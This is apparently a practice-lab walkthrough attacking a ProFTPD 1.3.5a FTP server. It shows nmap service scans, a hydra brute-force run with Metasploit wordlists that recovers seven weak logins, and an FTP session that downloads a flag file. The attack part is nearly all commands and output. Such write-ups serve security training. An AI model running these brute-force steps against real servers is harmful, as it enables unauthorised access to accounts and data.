# ProFTP

nmap enum

```
root@attackdefense:~# ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
2: ip_vti0@NONE: <NOARP> mtu 1480 qdisc noop state DOWN group default qlen 1000
    link/ipip 0.0.0.0 brd 0.0.0.0
108118: eth0@if108119: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:0a:01:00:07 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 10.1.0.7/16 brd 10.1.255.255 scope global eth0
       valid_lft forever preferred_lft forever
108121: eth1@if108122: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:c0:a0:95:02 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 192.160.149.2/24 brd 192.160.149.255 scope global eth1
       valid_lft forever preferred_lft forever

root@attackdefense:~# nmap 192.160.149.3
Starting Nmap 7.70 ( https://nmap.org ) at 2023-11-25 15:30 UTC
Nmap scan report for target-1 (192.160.149.3)
Host is up (0.000014s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE
21/tcp open  ftp
MAC Address: 02:42:C0:A0:95:03 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.27 seconds

root@attackdefense:~# nmap -p21 -O -sV 192.160.149.3
Starting Nmap 7.70 ( https://nmap.org ) at 2023-11-25 15:30 UTC
Nmap scan report for target-1 (192.160.149.3)
Host is up (0.000037s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     ProFTPD 1.3.5a
MAC Address: 02:42:C0:A0:95:03 (Unknown)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 2.6.32 (96%), Linux 3.2 - 4.9 (96%), Linux 2.6.32 - 3.10 (96%), Linux 3.4 - 3.10 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Synology DiskStation Manager 5.2-5644 (94%), Netgear RAIDiator 4.2.28 (94%), Linux 2.6.32 - 2.6.35 (94%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop
Service Info: OS: Unix

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 4.27 seconds
```

brute force pass

```
root@attackdefense:~# hydra -L /usr/share/wordlists/metasploit/common_users.txt -P /usr/share/wordlists/metasploit/unix_passwords.txt 192.160.149.3 ftp
Hydra v8.8 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-11-25 15:54:07
[DATA] max 16 tasks per 1 server, overall 16 tasks, 7063 login tries (l:7/p:1009), ~442 tries per task
[DATA] attacking ftp://192.160.149.3:21/
[21][ftp] host: 192.160.149.3   login: sysadmin   password: 654321
[21][ftp] host: 192.160.149.3   login: rooty   password: qwerty
[21][ftp] host: 192.160.149.3   login: demo   password: butterfly
[21][ftp] host: 192.160.149.3   login: auditor   password: chocolate
[21][ftp] host: 192.160.149.3   login: anon   password: purple
[21][ftp] host: 192.160.149.3   login: administrator   password: tweety
[21][ftp] host: 192.160.149.3   login: diag   password: tigger
1 of 1 target successfully completed, 7 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-11-25 15:54:48
```

get flag

```
root@attackdefense:~# ftp 192.160.149.3
Connected to 192.160.149.3.
220 ProFTPD 1.3.5a Server (AttackDefense-FTP) [::ffff:192.160.149.3]
Name (192.160.149.3:root): auditor
331 Password required for auditor
Password:
230 User auditor logged in
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful
150 Opening ASCII mode data connection for file list
-rw-r--r--   1 0        0              33 Nov 20  2018 secret.txt
226 Transfer complete
ftp> get secret.txt 
local: secret.txt remote: secret.txt
200 PORT command successful
150 Opening BINARY mode data connection for secret.txt (33 bytes)
226 Transfer complete
33 bytes received in 0.00 secs (240.4967 kB/s)
ftp> bye
221 Goodbye.
root@attackdefense:~# cat secret.txt 
098f6bcd4621d373cade4e832627b4f6
```
